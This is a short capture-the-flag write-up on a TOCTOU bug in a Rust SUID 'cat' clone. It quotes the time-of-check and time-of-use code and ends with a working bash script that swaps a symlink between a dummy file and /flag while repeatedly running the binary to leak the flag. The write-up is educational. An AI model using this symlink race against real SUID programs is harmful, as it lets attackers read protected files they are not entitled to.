+++
title = "superCAT"
date = 2026-06-26
authors = ["Vighnesh"]
+++

> SuperCat. DO NOT EAT.
### Handout
[supercat.tar.gz](attachments/supercat.tar.gz)

---

Category: Misc

We were given a rust implementation of a stripped down cat. This is a basic TOCTOU attack.
Infamously rust makes it very easy to make this mistake if you use the standard fs abstraction as they all take a path and re-resolve it every time.  

[A very good blog post on the pitfalls in rust's fs implementation.](https://corrode.dev/blog/bugs-rust-wont-catch/)

Time of check
```    
let file = Path::new(&args[1]);
let file_meta = std::fs::metadata(file).expect("could not get file info");
```

Time of use
```
let content = fs::read_to_string(file).expect("Could not read file as string");
```


In this we keep swapping the symlink between a file we own and a file we want to read but cant while simultaneously running the binary.
Eventually we get the timing correct and get the flag.
Essentially at the time of check we are pointing to the dummy file and at the time of use we are pointing to the flag and since this is SUID binary we get the flag.

```
BINARY="/usr/local/bin/supercat"
TARGET="/flag"
DUMMY="dummy_file"
LINK="link_file"

touch $DUMMY

# here we are swapping symlinks
(
    while true; do
        ln -sf "$DUMMY" "$LINK"
        ln -sf "$TARGET" "$LINK"
    done
) &
# here we are running supercat
while true; do
    RESULT=$($BINARY "$LINK" 2>/dev/null)

    if [[ "$RESULT" == *"GPNCTF"* ]]; then
        echo $RESULT 
    fi
done
```
